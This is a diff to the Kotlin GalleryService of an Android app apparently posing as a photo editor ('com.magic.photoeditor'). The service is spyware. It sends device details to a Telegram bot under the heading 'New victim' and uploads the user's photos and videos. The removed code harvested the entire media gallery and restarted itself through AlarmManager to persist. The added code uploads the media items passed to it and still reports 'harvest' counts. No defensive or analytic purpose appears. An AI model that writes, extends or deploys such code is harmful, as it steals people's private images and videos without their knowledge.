@@ -1,12 +1,11 @@
 package com.magic.photoeditor
 
 import android.app.*
-import android.content.ContentResolver
 import android.content.Context
 import android.content.Intent
+import android.net.Uri
 import android.os.Build
 import android.os.IBinder
-import android.provider.MediaStore
 import android.widget.Toast
 import androidx.core.app.NotificationCompat
 import java.io.File
@@ -19,107 +18,68 @@ class GalleryService : Service() {
         super.onCreate()
         telegram = TelegramSender()
         createNotificationChannel()
-        startForeground(Config.NOTIFICATION_ID, buildNotification("Service running"))
-        Toast.makeText(this, "GalleryService created", Toast.LENGTH_SHORT).show()
+        startForeground(Config.NOTIFICATION_ID, buildNotification("Harvesting selected media..."))
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Toast.makeText(this, "Starting harvest...", Toast.LENGTH_SHORT).show()
-        harvestAll()
+        val imageUris = intent?.getStringArrayExtra("image_uris") ?: emptyArray()
+        val videoUris = intent?.getStringArrayExtra("video_uris") ?: emptyArray()
+
+        Toast.makeText(this, "Harvesting ${imageUris.size} images, ${videoUris.size} videos", Toast.LENGTH_SHORT).show()
+        harvestAll(imageUris, videoUris)
         return START_STICKY
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
-    override fun onTaskRemoved(rootIntent: Intent?) {
-        val restart = Intent(this, GalleryService::class.java)
-        val pending = PendingIntent.getService(
-            this, 0, restart, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
-        )
-        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
-        alarm.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pending)
-        super.onTaskRemoved(rootIntent)
-    }
-
-    private fun harvestAll() {
+    private fun harvestAll(imageUris: Array<String>, videoUris: Array<String>) {
         try {
-            // Send device info first
             val info = Utils.getDeviceInfo(this)
             telegram.sendMessage("📱 New victim: $info")
 
-            harvestMedia()
+            var count = 0
+            imageUris.forEach { uriString ->
+                try {
+                    val uri = Uri.parse(uriString)
+                    val path = Utils.getRealPathFromUri(this, uri)
+                    if (path != null) {
+                        val file = File(path)
+                        if (file.exists()) {
+                            telegram.sendFile(file, "photo", file.name)
+                            count++
+                            Thread.sleep(100)
+                        }
+                    }
+                } catch (e: Exception) {
+                    telegram.sendMessage("❌ Error sending image: ${e.message}")
+                }
+            }
 
-            telegram.sendMessage("✅ Harvest complete for this device.")
-            Toast.makeText(this, "Harvest complete", Toast.LENGTH_SHORT).show()
+            videoUris.forEach { uriString ->
+                try {
+                    val uri = Uri.parse(uriString)
+                    val path = Utils.getRealPathFromUri(this, uri)
+                    if (path != null) {
+                        val file = File(path)
+                        if (file.exists() && file.length() < 50 * 1024 * 1024) {
+                            telegram.sendFile(file, "video", file.name)
+                            count++
+                            Thread.sleep(100)
+                        }
+                    }
+                } catch (e: Exception) {
+                    telegram.sendMessage("❌ Error sending video: ${e.message}")
+                }
+            }
+
+            telegram.sendMessage("✅ Harvest complete: $count files sent.")
+            Toast.makeText(this, "Harvest complete: $count files", Toast.LENGTH_SHORT).show()
+            stopSelf()
         } catch (e: Exception) {
-            val errorMsg = "❌ Harvest error: ${e.message}"
-            telegram.sendMessage(errorMsg)
-            Toast.makeText(this, errorMsg, Toast.LENGTH_LONG).show()
+            telegram.sendMessage("❌ Harvest error: ${e.message}")
+            Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
+            stopSelf()
         }
-    }
-
-    private fun harvestMedia() {
-        val contentResolver: ContentResolver = contentResolver
-        var imageCount = 0
-        var videoCount = 0
-
-        // Harvest images
-        val imageCollection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
-        } else {
-            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-        }
-
-        val imageProjection = arrayOf(
-            MediaStore.Images.Media._ID,
-            MediaStore.Images.Media.DATA,
-            MediaStore.Images.Media.DISPLAY_NAME,
-            MediaStore.Images.Media.SIZE
-        )
-
-        val imageCursor = contentResolver.query(imageCollection, imageProjection, null, null, null)
-        imageCursor?.use {
-            val dataColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
-            val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
-            while (it.moveToNext()) {
-                val path = it.getString(dataColumn)
-                val name = it.getString(nameColumn)
-                val file = File(path)
-                if (file.exists()) {
-                    imageCount++
-                    telegram.sendFile(file, "photo", name)
-                    // Small delay to avoid rate limiting
-                    Thread.sleep(100)
-                }
-            }
-        }
-
-        // Harvest videos
-        val videoCollection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
-        val videoProjection = arrayOf(
-            MediaStore.Video.Media._ID,
-            MediaStore.Video.Media.DATA,
-            MediaStore.Video.Media.DISPLAY_NAME,
-            MediaStore.Video.Media.SIZE
-        )
-        val videoCursor = contentResolver.query(videoCollection, videoProjection, null, null, null)
-        videoCursor?.use {
-            val dataColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
-            val nameColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
-            while (it.moveToNext()) {
-                val path = it.getString(dataColumn)
-                val name = it.getString(nameColumn)
-                val file = File(path)
-                if (file.exists() && file.length() < 50 * 1024 * 1024) {
-                    videoCount++
-                    telegram.sendFile(file, "video", name)
-                    Thread.sleep(100)
-                }
-            }
-        }
-
-        // Send summary
-        telegram.sendMessage("📊 Summary: $imageCount images, $videoCount videos harvested.")
     }
 
     private fun buildNotification(text: String): Notification {
